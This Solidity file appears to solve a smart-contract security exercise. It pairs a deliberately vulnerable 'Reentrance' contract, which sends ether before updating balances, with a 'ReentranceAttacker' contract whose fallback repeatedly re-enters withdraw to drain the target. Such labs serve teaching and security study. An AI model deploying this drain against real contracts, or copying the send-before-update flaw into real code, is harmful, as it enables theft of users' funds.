// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    IReentrance public reentrance;
    uint256 public etherAmount = 0.001 * 10**18;
    address payable owner;

    constructor(address _reentrance) public {
        owner = payable(msg.sender);
        reentrance = IReentrance(_reentrance);
    }

    function donate(address _to) external payable {
        require(msg.value == 0.001 ether);
        reentrance.donate{value: msg.value}(_to);
    }

    function withdraw() external {
        reentrance.withdraw(etherAmount);
    }

    function recoverFunds() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(etherAmount);
        }
    }
}
